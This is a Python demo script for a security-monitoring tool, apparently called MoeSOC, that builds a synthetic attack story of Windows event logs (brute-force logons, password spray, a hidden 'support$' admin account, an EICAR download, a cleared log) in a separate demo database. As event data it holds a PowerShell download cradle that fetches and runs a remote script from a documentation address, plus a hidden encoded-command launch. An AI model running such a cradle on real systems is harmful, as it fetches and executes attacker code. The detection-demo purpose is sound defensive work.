"""Portfolio demo: a synthetic attack story in a separate, clearly labelled database.

    python scripts/demo.py            # build the demo database and open MoeSOC in demo mode
    python scripts/demo.py --no-gui   # build it and print what was found (used by tests)

Everything here is SYNTHETIC: fictional accounts on a lab computer (WS-LAB01.lab.example)
and RFC 5737 documentation addresses. The data is written to its own folder
(%LOCALAPPDATA%\\MoeSOC-Demo, or --data-dir), never to your real MoeSOC database. In demo
mode the window is titled "DEMO (synthetic data)", shows a DEMO badge, and Scan, Live
and Import are disabled, so real telemetry can never be mixed in.

The story (all within about 45 minutes, ending 30 minutes ago):
  1. 6 failed network logons for LAB\\alice from 203.0.113.66, then a successful one
  2. in that logon session: PowerShell started by Word with -EncodedCommand, running a
     download cradle; a hidden account "support$" created and added to Administrators
  3. a password spray from 198.51.100.23 against five accounts
  4. a browser downloads the EICAR test file; Microsoft Defender detects and
     quarantines it (Sysmon records the DNS lookup and the file write)
  5. the Security log is cleared
See docs/demo.md for a 5-minute walkthrough.
"""

from __future__ import annotations

import argparse
import re
import sys
from datetime import timedelta
from pathlib import Path
from xml.sax.saxutils import escape

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from moesoc.core.config import AppConfig, default_data_dir  # noqa: E402
from moesoc.engine.rules import load_rules  # noqa: E402
from moesoc.engine.scanner import ScanService  # noqa: E402
from moesoc.storage.database import Database  # noqa: E402
from moesoc.storage.repository import DetectionRepository  # noqa: E402
from moesoc.utils.time import utc_now  # noqa: E402

FIXTURES = ROOT / "tests" / "fixtures"
MARKER = "DEMO-DATABASE.txt"
SESSION = "0x7a3f21"
WRITER_GUID = "{8A1C5F3E-6B2A-6702-2F01-000000000E00}"
POWERSHELL_GUID = "{8A1C5F3E-0000-0000-0000-00000000D7E0}"
CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.80/stage.ps1')"


def fixture(name: str) -> str:
    return (FIXTURES / name).read_text(encoding="utf-8")


def stamp(at) -> str:
    return at.strftime("%Y-%m-%dT%H:%M:%S.%f") + "0Z"


def set_time(xml: str, at) -> str:
    return re.sub(r'SystemTime="[^"]+"', f'SystemTime="{stamp(at)}"', xml, count=1)


def set_record(xml: str, record: int) -> str:
    return re.sub(r"<EventRecordID>\d+<", f"<EventRecordID>{record}<", xml, count=1)


def set_data(xml: str, **fields: str) -> str:
    for name, value in fields.items():
        pattern = rf'(<Data Name="{re.escape(name)}">)[^<]*(</Data>)'
        xml = re.sub(pattern, lambda m, v=value: m.group(1) + escape(v) + m.group(2), xml, count=1)
    return xml


def auth(event_id: int, user: str, at, record: int, ip: str, session: str | None = None) -> str:
    failure = event_id == 4625
    xml = fixture("4625_failed_network_logon.xml" if failure else "4624_successful_rdp_logon.xml")
    xml = set_record(set_time(xml, at), record)
    xml = set_data(xml, TargetUserName=user, IpAddress=ip, TargetDomainName="LAB")
    if not failure:
        xml = set_data(
            xml, LogonType="3", TargetUserSid="S-1-5-21-1111111111-2222222222-3333333333-1104"
        )
        if session:
            xml = set_data(xml, TargetLogonId=session)
    return xml


def build_story(end) -> list[str]:
    t0 = end - timedelta(minutes=45)
    at = lambda minutes, seconds=0: t0 + timedelta(minutes=minutes, seconds=seconds)  # noqa: E731
    records: list[str] = []

    # 1. Brute force, then a successful network logon (session SESSION).
    records += [auth(4625, "alice", at(0, 10 * i), 20000 + i, "203.0.113.66") for i in range(6)]
    records.append(auth(4624, "alice", at(1, 10), 20010, "203.0.113.66", SESSION))

    # 2. In that session: Word starts PowerShell with an encoded command; the script block.
    process = set_data(
        set_record(set_time(fixture("sysmon_1_process_create.xml"), at(3)), 20100),
        ProcessGuid=POWERSHELL_GUID,
        ProcessId="7420",
        LogonId=SESSION,
        ParentImage="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        CommandLine="powershell.exe -NoProfile -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A",
    )
    records.append(process)
    script = fixture("powershell_4104_script_block.xml")
    script = script.replace(
        "Get-Service | Where-Object Status -eq 'Running' | Select-Object -First 5", escape(CRADLE)
    )
    script = set_record(set_time(script, at(3, 5)), 20101).replace(
        'ProcessID="6700"', 'ProcessID="7420"'
    )
    records.append(script)

    # ... and a hidden account added to Administrators, by the same logon session.
    created = set_record(set_time(fixture("4720_user_account_created.xml"), at(6)), 20200)
    created = created.replace(">backup-svc2<", ">support$<")
    created = set_data(created, SubjectLogonId=SESSION, SubjectUserName="alice")
    added = set_record(set_time(fixture("4732_member_added_to_administrators.xml"), at(7)), 20201)
    added = set_data(added, SubjectLogonId=SESSION, SubjectUserName="alice")
    records += [created, added]

    # 3. Password spray from another documentation address.
    for i, user in enumerate(["svc-backup", "jdoe", "msmith", "kjones", "admin"]):
        records.append(auth(4625, user, at(15, 20 * i), 20300 + i, "198.51.100.23"))

    # 4. A browser downloads the EICAR test file; Defender detects and quarantines it.
    browser = set_data(
        set_record(set_time(fixture("sysmon_1_process_create.xml"), at(25)), 20400),
        ProcessGuid=WRITER_GUID,
        Image="C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
        ParentImage="C:\\Windows\\explorer.exe",
        CommandLine="msedge.exe",
        ProcessId="5120",
    )
    dns = set_record(set_time(fixture("sysmon_22_dns_query.xml"), at(25, 20)), 20401)
    dns = set_data(
        dns, Image="C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe", ProcessId="5120"
    )
    path = "C:\\Users\\alice\\Downloads\\eicar.com.txt"
    write = set_record(set_time(fixture("sysmon_11_file_create.xml"), at(25, 30)), 20402)
    write = set_data(
        write,
        TargetFilename=path,
        Image="C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
        ProcessId="5120",
    )
    detected = set_record(
        set_time(fixture("defender_1116_malware_detected.xml"), at(25, 35)), 20403
    )
    quarantined = set_record(set_time(fixture("defender_1117_action_taken.xml"), at(25, 40)), 20404)
    records += [browser, dns, write, detected, quarantined]

    # 5. The Security log is cleared.
    cleared = set_record(set_time(fixture("1102_security_log_cleared.xml"), at(40)), 20500)
    records.append(cleared)
    return records


def prepare_folder(folder: Path) -> Path:
    """Use a dedicated folder; only a database this script created is ever replaced."""
    folder.mkdir(parents=True, exist_ok=True)
    marker = folder / MARKER
    database = folder / "moesoc.db"
    if database.exists() and not marker.exists():
        raise SystemExit(f"{database} exists but is not a demo database; choose another folder.")
    for suffix in ("", "-wal", "-shm"):
        candidate = folder / f"moesoc.db{suffix}"
        if candidate.exists():
            candidate.unlink()
    marker.write_text(
        "This folder holds the MoeSOC DEMO database: synthetic events only, created by "
        "scripts/demo.py. It is safe to delete.\n",
        encoding="utf-8",
    )
    return folder


def build(folder: Path) -> tuple[AppConfig, Database, dict]:
    config = AppConfig(data_dir=prepare_folder(folder), rules_dir=ROOT / "rules")
    database = Database(config.database_path)
    database.initialize()
    rules = load_rules(config.rules_dir)
    export = folder / "demo-synthetic-export.xml"
    export.write_text("\n".join(build_story(utc_now() - timedelta(minutes=30))), encoding="utf-8")
    service = ScanService(config, database, rules, host_aliases=list)
    summary = service.import_xml_file(export)
    print(
        f"Demo database: {config.database_path}\n"
        f"Imported {summary.events_new} synthetic events; {summary.detections_new} findings."
    )
    with database.connect() as conn:
        for d in sorted(DetectionRepository(conn).list_all(), key=lambda d: d.id):
            print(f"  #{d.id:<3} {d.rule_id:<8} {d.severity:<7} risk {d.risk_score:>3}  {d.title}")
    return config, database, rules


def main() -> int:
    parser = argparse.ArgumentParser(description="MoeSOC demo with synthetic data")
    parser.add_argument("--data-dir", type=Path, default=default_data_dir().parent / "MoeSOC-Demo")
    parser.add_argument("--no-gui", action="store_true")
    parser.add_argument(
        "--screenshots", type=Path, help="open the demo, save screenshots here, and exit"
    )
    args = parser.parse_args()
    config, database, rules = build(args.data_dir)
    if args.no_gui:
        return 0
    from PySide6.QtWidgets import QApplication

    from moesoc.gui.main_window import MainWindow
    from moesoc.gui.theme import apply_theme

    app = QApplication(sys.argv)
    apply_theme(app)
    window = MainWindow(config, database, rules, demo=True)
    window.resize(1440, 900)
    window.show()
    if args.screenshots:
        return take_screenshots(app, window, database, args.screenshots)
    return app.exec()


def take_screenshots(app, window, database: Database, folder: Path) -> int:
    """Walk the demo story and save one screenshot per step (used for docs/demo.md)."""
    import time

    def settle(seconds: float = 0.5) -> None:
        deadline = time.monotonic() + 30
        while window.busy and time.monotonic() < deadline:
            app.processEvents()
            time.sleep(0.02)
        end = time.monotonic() + seconds
        while time.monotonic() < end:
            app.processEvents()
            time.sleep(0.02)

    def shot(name: str) -> None:
        settle()
        window.meta.setText("WORKSTATION  ·  demo")  # never show this PC's name
        window.grab().save(str(folder / name))
        print(f"  saved {name}")

    folder.mkdir(parents=True, exist_ok=True)
    with database.connect() as conn:
        ids = {d.rule_id: d.id for d in DetectionRepository(conn).list_all()}
    settle(1.0)
    window.select_page("Overview")
    shot("demo-1-overview.png")
    window.select_page("Detections")
    window.detections.select_detection(ids["COR-003"])
    shot("demo-2-cor003-chain.png")
    window.open_story(ids["COR-003"])
    shot("demo-3-story.png")
    window.select_page("Detections")
    window.detections.select_detection(ids["COR-004"])
    shot("demo-4-cor004-defender.png")
    window.select_page("Detections")
    window.detections.select_detection(ids["DET-007"])
    shot("demo-5-det007-powershell.png")
    window.close()
    settle(0.2)
    return 0


if __name__ == "__main__":
    sys.exit(main())
